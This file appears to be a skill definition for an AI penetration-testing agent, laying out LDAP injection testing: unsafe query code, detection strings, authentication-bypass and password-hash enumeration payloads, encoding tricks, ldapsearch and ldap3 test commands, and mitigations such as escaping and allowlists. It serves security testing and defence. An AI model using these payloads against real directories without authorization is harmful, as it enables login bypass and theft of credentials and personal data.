---
name: ldap-injection-testing
description: Professional skills and methodology for LDAP injection testing
version: 1.0.0
---

# LDAP Injection Testing

## Overview

LDAP injection exploits flaws in query construction, similar to SQL injection, and may lead to information disclosure or authorization bypass. This skill covers detection, exploitation, and prevention.

## How the Vulnerability Works

When an application concatenates user input into LDAP queries without adequate validation and filtering, attackers can alter query logic.

**Unsafe code example:**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## LDAP Basics

### Query Syntax

**Basic queries:**
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### Special Characters

**Characters requiring escaping:**
- `(` `)` - Parentheses
- `*` - Wildcard
- `\` - Escape character
- `/` - Path separator
- `NUL` - Null character

## Testing Methods

### 1. Identify LDAP Input Points

**Common features:**
- User login
- User search
- Directory browsing
- Permission validation

### 2. Basic Detection

**Test special characters:**
```
*)(&
*)(|
*))(
*))%00
```

**Test logical operators:**
```
*)(&(cn=*
*)(|(cn=*
*))(!(cn=*
```

### 3. Authentication Bypass

**Basic bypass:**
```
Username: *)(&
Password: *
Query: (&(cn=*)(&)(userPassword=*))
```

**More precise bypass:**
```
Username: admin)(&(cn=admin
Password: *))
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

### 4. Information Disclosure

**Enumerate users:**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

**Retrieve attributes:**
```
*)(|(cn=*)(userPassword=*
*)(|(objectClass=*)(cn=*
```

## Exploitation Techniques

### Authentication Bypass

**Method 1: Logic bypass**
```
Input: *)(&
Query: (&(cn=*)(&)(userPassword=*))
Result: Matches all users
```

**Method 2: Comment bypass**
```
Input: admin)(&(cn=admin
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

**Method 3: Wildcards**
```
Input: *)(|(cn=*)(userPassword=*
Query: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
```

### Information Disclosure

**Enumerate all users:**
```
Search: *)(cn=*
Result: Returns all cn attributes
```

**Retrieve password hashes:**
```
Search: *)(|(cn=*)(userPassword=*
Result: Returns users and password hashes
```

**Retrieve sensitive attributes:**
```
Search: *)(|(cn=*)(mail=*)(telephoneNumber=*
Result: Returns multiple sensitive attributes
```

### Privilege Escalation

**Modify query logic:**
```
Original: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
Injection: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
Result: May bypass permission checks
```

## Bypass Techniques

### Encoding Bypass

**URL encoding:**
```
*)(& → %2A%29%28%26
*)(| → %2A%29%28%7C
```

**Unicode encoding:**
```
* → \u002A
( → \u0028
) → \u0029
```

### Comment Bypass

**Using comments:**
```
*)(&(cn=*
*)(|(cn=*
```

### Null Character Injection

**Using null bytes:**
```
*))%00
```

## Tools

### JXplorer

**Graphical LDAP client:**
- Connect to the LDAP server
- Browse the directory structure
- Run query tests

### ldapsearch

```bash
# Basic query
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# Test injection
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

### Burp Suite

1. Intercept an LDAP query request
2. Modify query parameters
3. Observe the response

### Python Script

```python
import ldap3

server = ldap3.Server('ldap://target.com')
conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                        user='cn=admin,dc=example,dc=com',
                        password='password')

# Test injection
filter_str = '*)(&'
conn.search('dc=example,dc=com', filter_str)
print(conn.entries)
```

## Verification and Reporting

### Verification Steps

1. Confirm control over LDAP queries
2. Verify authentication bypass or information disclosure
3. Assess impact (unauthorized access, data disclosure, etc.)
4. Record the complete proof of concept
5. Record confirmed findings with `report_finding`, the platform's only entry point for findings. Include location, type, severity, reproduction steps/PoC, and remediation guidance

### Report Essentials

- Vulnerability location and input parameters
- LDAP query construction method
- Complete exploitation steps and PoC
- Remediation guidance (input validation, parameterized queries, etc.)

## Mitigations

### Recommended Approach

1. **Input validation**
   ```java
   private static final String[] LDAP_ESCAPE_CHARS = 
       {"\\", "*", "(", ")", "\0", "/"};
   
   public static String escapeLDAP(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(LDAP_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized queries**
   ```java
   // Use LDAP API parameterization
   String filter = "(&(cn={0})(userPassword={1}))";
   Object[] args = {escapedCN, escapedPassword};
   // Build queries through the API
   ```

3. **Allowlist validation**
   ```java
   // Allow only specific characters
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Least privilege**
   - Use a least-privilege account for LDAP connections
   - Restrict queryable attributes
   - Use access control lists

5. **Error handling**
   - Do not return detailed error messages
   - Consistent error responses
   - Log errors

## Considerations

- Test only in authorized environments
- Account for syntax differences between LDAP servers
- Avoid disrupting the directory during testing
- Understand the target LDAP server configuration